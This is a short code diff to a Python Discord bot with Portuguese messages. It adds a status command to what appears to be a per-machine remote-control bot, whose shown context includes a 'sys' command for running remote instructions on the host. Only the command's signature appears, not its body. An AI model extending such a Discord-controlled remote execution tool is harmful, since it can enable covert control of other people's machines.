@@ -153,6 +153,16 @@ async def help_command(interaction: discord.Interaction):
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
 
 
+@bot.tree.command(name="sta", description="Verifica o status da máquina atual.")
+async def status(interaction: discord.Interaction):
+    if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True)
+        normal_activity()
+        await interaction.followup.send("🟢 A máquina está **Online** e a responder normalmente.")
+    else:
+        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
+
+
 @bot.tree.command(name="sys", description="Executa uma instrução remota.")
 async def sys_action(interaction: discord.Interaction, comando: str):
     if interaction.channel.name.lower() == platform.node().lower():
